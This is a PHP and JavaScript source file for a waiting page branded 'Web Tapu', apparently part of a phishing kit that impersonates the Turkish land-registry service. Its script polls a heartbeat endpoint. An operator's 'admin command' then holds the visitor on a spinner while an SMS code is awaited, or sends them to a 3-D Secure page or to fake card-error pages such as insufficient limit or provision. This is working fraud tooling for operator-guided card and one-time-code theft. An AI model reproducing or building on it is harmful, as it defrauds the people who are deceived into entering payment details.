<?php
/**
 * bekle.php — Admin "Bekle" komutu veya 3D redirect sonrası bekleme ekranı
 */
if (session_status() === PHP_SESSION_NONE) session_start();
require_once __DIR__ . '/db.php';
if (empty($_SESSION['basvuru'])) { header('Location: ' . BASE_PATH . '/'); exit; }
ip_ban_kontrol();
$_SESSION['adim'] = 3;
?>
<!DOCTYPE html>
<html lang="tr">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>İşleminiz Hazırlanıyor — Web Tapu</title>
<link rel="stylesheet" href="<?= BASE_PATH ?>/assets/css/web-tapu-custom.css">
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#ecf0f5;font-family:'Inter',sans-serif}
  .bekle-card{background:#fff;border-radius:16px;padding:48px 32px;max-width:420px;width:90%;text-align:center;box-shadow:0 8px 32px rgba(0,0,0,.12)}
  .spinner{width:64px;height:64px;border:5px solid #e7ebee;border-top-color:#3b77ac;border-radius:50%;animation:spin 1s linear infinite;margin:0 auto 28px}
  @keyframes spin{to{transform:rotate(360deg)}}
  h2{font-size:20px;font-weight:700;color:#1c3761;margin-bottom:10px}
  p{font-size:14px;color:#6b7280;line-height:1.6}
  .bekle-dots{display:inline-block;animation:dots 1.4s steps(4,end) infinite}
  @keyframes dots{'0%,100%'{content:'.'}  '25%'{content:'..'}  '50%'{content:'...'}  '75%'{content:'....'}  }
  .bekle-dots::after{content:'.';animation:dots 1.4s steps(4,end) infinite}
</style>
</head>
<body>
<div class="bekle-card">
  <div class="spinner"></div>
  <h2>İşleminiz Hazırlanıyor</h2>
  <p>Lütfen bir süre bekleyin, sayfayı kapatmayınız<span class="bekle-dots"></span></p>
  <p style="margin-top:20px;font-size:12px;color:#9ca3af">Bu işlem birkaç dakika sürebilir.</p>
</div>
<script>
(function(){
  function heartbeat(){
    fetch('<?= BASE_PATH ?>/heartbeat.php',{method:'POST',credentials:'same-origin'})
      .then(r=>r.json())
      .then(d=>{
        var dur = d.durum || 'bekle';
        // Bu durumlar spinner'da bekletir — hiçbir yere gitme
        if(dur === 'bekle' || dur === 'sms_bekleniyor' || dur === 'aktif') return;
        // 3d_gonder: henüz ACS'e gidilmemişse yönlendir (acs_url gereklii)
        if(dur === '3d_gonder'){
          if(d.acs_url && d.acs_url.length > 0){ location.href = d.acs_url; }
          return;
        }
        if(dur === '3d_hatali'){
          var acsUrl = d.acs_url || '<?= BASE_PATH ?>/acs/other.php';
          var sep = acsUrl.indexOf('?') === -1 ? '?' : '&';
          location.href = acsUrl + sep + 'hata=1';
          return;
        }
        if(dur === 'tebrik')      { location.href = '<?= BASE_PATH ?>/sonuc.php'; return; }
        if(dur === 'kart_hatali') { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=kart_hatali'; return; }
        if(dur === 'eticaret_kapali')     { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=eticaret_kapali'; return; }
        if(dur === 'limit_yetersiz')      { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=limit_yetersiz'; return; }
        if(dur === 'kart_desteklenmiyor') { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=kart_desteklenmiyor'; return; }
        if(dur === 'provizyon_gonder')    { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=provizyon_gonder'; return; }
        if(dur === 'provizyon_hatali')    { location.href = '<?= BASE_PATH ?>/odeme_hata.php?hata=provizyon_hatali'; return; }
      }).catch(()=>{});
  }
  setInterval(heartbeat, 3000);
  heartbeat();
})();
</script>
</body>
</html>
